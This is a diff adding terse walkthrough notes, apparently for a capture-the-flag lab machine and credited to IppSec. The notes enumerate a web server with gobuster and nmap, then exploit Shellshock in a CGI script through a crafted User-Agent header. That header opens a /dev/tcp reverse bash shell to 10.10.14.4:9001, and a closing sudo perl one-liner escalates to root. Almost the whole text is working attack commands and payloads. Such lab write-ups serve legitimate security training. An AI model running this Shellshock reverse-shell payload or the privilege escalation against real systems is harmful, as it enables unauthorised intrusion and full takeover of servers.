@@ -1,0 +1,16 @@
+//based on IppSec
+gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 302,307,200,204,301,403 -o gobuster.txt
+gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 302,307,200,204,301,403 -x sh,pl -o gobuster.txt
+/cgi-bin/user.sh
+nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+//burp configure burp listener in 127.0.0.1:80 redirect to 10.10.10.56:80
+//playing with the request
+
+GET /cgi-bin/user.sh HTTP/1.1
+Host: localhost
+User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'
+Connection: close
+Content-Length: 2
+
+//got shell
+sudo perl -e 'exec "/bin/sh";'		//got root
